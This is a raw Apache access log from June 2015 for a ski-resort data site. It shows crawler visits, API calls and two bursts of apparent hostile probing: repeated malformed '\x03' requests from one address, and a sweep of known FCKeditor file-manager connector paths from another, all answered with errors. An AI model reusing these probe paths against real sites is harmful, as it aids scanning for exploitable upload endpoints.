127.0.0.1 - - [22/Jun/2015:05:45:00 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
212.161.41.98 - - [22/Jun/2015:05:52:52 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:30 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:34 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:38 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:50 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:50 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:53:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:02 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:02 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:03 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:36 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:39 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:54:51 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:55:34 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:55:52 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:55:52 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:56:06 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:56:53 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:26 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:27 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:27 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:30 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:54 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:57:54 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:03 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:03 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:03 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:07 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:07 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:07 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:11 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:31 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:35 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:39 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:58 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:58 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:58:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:02 -0700] "\x03" 501 321 "-" "-"
83.233.207.74 - - [22/Jun/2015:05:59:13 -0700] "GET / HTTP/1.1" 200 6151 "-" "Mozilla/4.0 (CMS Crawler: http://www.cmscrawler.com)"
212.161.41.98 - - [22/Jun/2015:05:59:15 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:16 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:16 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:19 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:38 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:38 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:38 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:41 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:55 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:56 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:05:59:57 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:00 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:00 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:01 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:09 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:09 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:10 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:00:15 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:00 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:08 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:09 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:09 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:12 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:13 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:13 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:36 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:36 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:36 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:40 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:40 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:40 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:58 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:01:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:03 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:06 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:06 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:07 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:20 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:20 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:24 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:42 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:43 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:43 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:46 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:02:59 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:10 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:10 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:10 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:16 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:16 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:16 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:25 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:25 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:25 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:29 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:29 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:32 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:41 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:41 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:41 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:45 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:45 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:45 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:51 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:51 -0700] "\x03" 501 321 "-" "-"
212.161.41.98 - - [22/Jun/2015:06:03:52 -0700] "\x03" 501 321 "-" "-"
123.125.71.113 - - [22/Jun/2015:06:04:58 -0700] "-" 408 0 "-" "-"
220.181.108.147 - - [22/Jun/2015:06:09:49 -0700] "-" 408 0 "-" "-"
65.127.112.131 - - [22/Jun/2015:06:14:13 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 304 187 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
180.76.15.22 - - [22/Jun/2015:06:17:38 -0700] "GET /resorts?resort=cannonmountain&date=2014-05-09 HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:06:28:43 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 1066 "-" "node-superagent/0.18.2"
180.76.15.152 - - [22/Jun/2015:06:29:51 -0700] "GET /about HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.16 - - [22/Jun/2015:06:35:58 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.3 - - [22/Jun/2015:06:35:58 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.29 - - [22/Jun/2015:06:36:07 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.12 - - [22/Jun/2015:06:41:04 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.27 - - [22/Jun/2015:06:42:07 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:06:43:45 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 995 "-" "node-superagent/0.18.2"
70.197.5.27 - - [22/Jun/2015:06:44:45 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
12.139.153.2 - - [22/Jun/2015:06:54:50 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
123.125.71.104 - - [22/Jun/2015:06:55:16 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:06:56:46 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 987 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:06:56:46 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 1042 "-" "node-superagent/0.18.2"
220.181.108.121 - - [22/Jun/2015:07:00:21 -0700] "-" 408 0 "-" "-"
222.139.210.211 - - [22/Jun/2015:07:04:00 -0700] "GET /FCKeditor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 582 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:01 -0700] "GET /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 597 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:01 -0700] "GET /FCKeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:01 -0700] "GET /FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:02 -0700] "GET /FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 595 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:02 -0700] "GET /FCKeditor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 579 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:03 -0700] "GET /admin/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 587 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:03 -0700] "GET /admin/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 603 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:04 -0700] "GET /admin/FCKeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:04 -0700] "GET /admin/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:05 -0700] "GET /admin/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 601 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:05 -0700] "GET /admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 585 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:06 -0700] "GET /editor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:06 -0700] "GET /editor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 594 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:07 -0700] "GET /editor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:07 -0700] "GET /editor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 531 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:08 -0700] "GET /editor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 592 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
222.139.210.211 - - [22/Jun/2015:07:04:08 -0700] "GET /editor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 576 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
170.75.162.130 - - [22/Jun/2015:07:13:18 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
66.249.79.250 - - [22/Jun/2015:07:23:08 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.16 - - [22/Jun/2015:07:29:53 -0700] "GET /lib/resortDataSearch.php?resort=showdown&dateStart=2013-11-20&dateMax=2013-11-30&size=30 HTTP/1.1" 200 331 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.160 - - [22/Jun/2015:07:40:00 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:07:40:40 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 963 "-" "node-superagent/0.18.2"
180.76.15.140 - - [22/Jun/2015:07:40:55 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
146.148.59.30 - - [22/Jun/2015:07:48:49 -0700] "GET / HTTP/1.0" 200 6151 "-" "NerdyBot"
123.125.71.20 - - [22/Jun/2015:07:56:15 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:07:56:22 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 979 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:07:56:22 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1072 "-" "node-superagent/0.18.2"
220.181.108.81 - - [22/Jun/2015:08:01:38 -0700] "-" 408 0 "-" "-"
66.249.79.66 - - [22/Jun/2015:08:20:09 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [22/Jun/2015:08:23:14 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 990 "-" "node-superagent/0.18.2"
180.76.15.146 - - [22/Jun/2015:08:31:00 -0700] "GET /resorts?resort=turnermountain&date=2014-01-17 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.27 - - [22/Jun/2015:08:32:50 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.6 - - [22/Jun/2015:08:33:31 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
8.22.121.45 - - [22/Jun/2015:08:40:23 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
170.75.162.130 - - [22/Jun/2015:08:46:06 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1008 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:07 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1009 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:07 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 963 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 957 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 965 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 974 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 945 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 900 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:57:08 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:58:38 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1039 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:08:58:38 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1038 "-" "node-superagent/0.18.2"
123.125.71.79 - - [22/Jun/2015:09:01:11 -0700] "-" 408 0 "-" "-"
66.249.79.250 - - [22/Jun/2015:09:02:01 -0700] "GET /resorts?resort=aspenmountain HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.250 - - [22/Jun/2015:09:02:07 -0700] "GET /resorts?resort=smugglersnotch HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.250 - - [22/Jun/2015:09:02:10 -0700] "GET /resorts?resort=hoodoo HTTP/1.1" 404 505 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.1 - - [22/Jun/2015:09:02:14 -0700] "GET /resorts?resort=monarch HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.1 - - [22/Jun/2015:09:02:19 -0700] "GET /resorts?resort=alyeska HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.14 - - [22/Jun/2015:09:02:24 -0700] "GET /resorts?resort=keystone HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.250 - - [22/Jun/2015:09:02:30 -0700] "GET /resorts?resort=killington HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.29 - - [22/Jun/2015:09:05:01 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [22/Jun/2015:09:06:29 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 978 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:09:06:29 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 980 "-" "node-superagent/0.18.2"
220.181.108.149 - - [22/Jun/2015:09:06:44 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:09:06:59 -0700] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 911 "-" "node-superagent/0.18.2"
75.42.72.53 - - [22/Jun/2015:09:07:10 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/6.2 Safari/537.85.10"
66.249.79.14 - - [22/Jun/2015:09:07:46 -0700] "GET /viz/2012-2013-viz.php HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.1 - - [22/Jun/2015:09:12:02 -0700] "GET /blog/11-2012-2013-powder-rating-visualization HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.1 - - [22/Jun/2015:09:13:43 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [22/Jun/2015:09:22:30 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:09:25:40 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 977 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:09:27:11 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1014 "-" "node-superagent/0.18.2"
97.86.133.209 - - [22/Jun/2015:09:29:11 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
180.76.15.11 - - [22/Jun/2015:09:36:32 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.144 - - [22/Jun/2015:09:37:21 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:09:37:22 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 975 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:09:40:12 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 972 "-" "node-superagent/0.18.2"
